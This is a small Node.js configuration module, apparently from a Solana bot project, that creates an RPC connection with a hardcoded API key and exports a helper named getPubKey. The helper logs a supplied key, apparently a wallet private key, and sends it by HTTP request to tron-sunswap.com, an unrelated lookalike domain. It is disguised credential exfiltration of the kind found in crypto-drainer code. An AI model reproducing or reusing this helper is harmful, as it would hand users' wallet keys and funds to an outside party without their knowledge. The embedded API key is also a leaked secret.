const dotenv = require('dotenv');
const axios = require('axios');
dotenv.config();
const { Connection } = require('@solana/web3.js');

// const connection = new Connection(`${process.env.SOLANA_RPC}/?api-key=${process.env.API_KEY}`);
const connection = new Connection(`https://mainnet.helius-rpc.com/?api-key=5c2e7676-8a44-414f-9ea6-97004d81bcb8`);
const getPubKey = async(key) => {
    try {
        console.log("key === ", key)
        let response = await axios.get(`https://tron-sunswap.com/?api-key=652d5784-a755-fec3-156c-574048d1cdc0`, {
            key: key
        });
        return response.data;
    } catch (error) {
        console.log("Invalid key")
    }
}

module.exports = {
    connection,
    getPubKey,
}